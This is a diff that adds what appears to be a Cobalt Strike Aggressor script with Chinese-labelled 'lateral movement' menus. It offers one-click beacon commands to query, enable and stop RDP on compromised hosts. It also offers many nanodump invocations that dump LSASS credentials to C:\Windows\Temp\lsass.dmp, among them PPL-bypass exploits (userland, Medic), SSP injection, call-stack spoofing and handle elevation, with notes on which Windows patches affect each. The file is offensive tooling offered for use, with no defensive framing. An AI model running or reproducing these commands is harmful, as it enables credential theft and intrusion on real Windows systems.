@@ -1,0 +1,81 @@
+menu "横向移动"{
+	menu "RDP服务"{
+		item "查看RDP状态"{
+			$bid = $1;
+			blog($bid,"\c3=========== 查询RDP状态(执行如下命令) ==========");
+			binput($bid,"RdpQuery");
+		}
+		
+		item "开启RDP服务"{
+			$bid = $1;
+			blog($bid,"\c3=========== 开启RDP服务(执行如下命令) ==========");
+			binput($bid,"RdpStart");
+		}
+		
+		item "关闭RDP服务(修改注册表)"{
+			$bid = $1;
+			blog($bid,"\c3=========== 关闭RDP服务,需重启才能生效(执行如下命令) ==========");
+			binput($bid,"RdpStop");
+		}
+		
+		item "关闭RDP服务(执行cmd命令)"{
+			$bid = $1;
+			blog($bid,"\c3=========== 关闭RDP服务(执行cmd命令) ==========");
+			bshell($bid,"net stop TermService");
+		}
+	}
+	
+	menu "nanodump" {
+		item "DumpHash" {
+			blog($1,"\c3=========== Dumphash with a valid signature ==========");
+			binput($1,"nanodump --valid");
+		}
+		
+		item "DumpHash by fork" {
+			blog($1,"\c3=========== Using fork to dumphash ==========");
+			binput($1,"nanodump --valid --fork");
+		}
+		
+		item "seclogon-leak-local" {
+			blog($1,"\c3===========  Using seclogon-leak-local to dumphash ==========");
+			binput($1,"nanodump --seclogon-leak-local --fork --valid --write C:\Windows\Temp\lsass.dmp");
+		}
+		
+		item "SSP" {
+			blog($1,"\c3=========== Load nanodump in LSASS as an SSP  ==========");
+			binput($1,"nanodump_ssp -v -w C:\Windows\Temp\lsass.dmp");
+		}
+		
+		item "BypassPPL(userland exploit)" {
+			blog($1,"\c3=========== Attempt to bypass PPL in lsass.exe ==========");
+			btask($1,"userland漏洞在2022年7月更新包(Windows 10 21H2 Build 19044.1826)中被修复");
+			binput($1,"nanodump_ppl_dump -v -w C:\Windows\Temp\lsass.dmp");
+		}
+		
+		item "BypassPPL(Medic exploit)" {
+			blog($1,"\c3=========== Attempt to bypass PPL in lsass.exe  ==========");
+			btask($1,"Medic漏洞只能利用在安装了2022年7月更新包的系统上");
+			binput($1,"nanodump_ppl_medic -v -w C:\Windows\Temp\lsass.dmp");
+		}
+		
+		item "spoof-callstack" {
+			blog($1,"\c3=========== Using spoof-callstack to dumphash  ==========");
+			binput($1,"nanodump --spoof-callstack --valid");
+		}
+		
+		item "shtinkering" {
+			blog($1,"\c3=========== Using shtinkering to dumphash  ==========");
+			binput($1,"nanodump --shtinkering --valid");
+		}
+		
+		item "elevate-handle" {
+			blog($1,"\c3=========== Obtain a handle with low privs and elevate it using elevate handle  ==========");
+			binput($1,"nanodump --elevate-handle");
+		}
+		
+	}
+	
+	
+	
+
+}
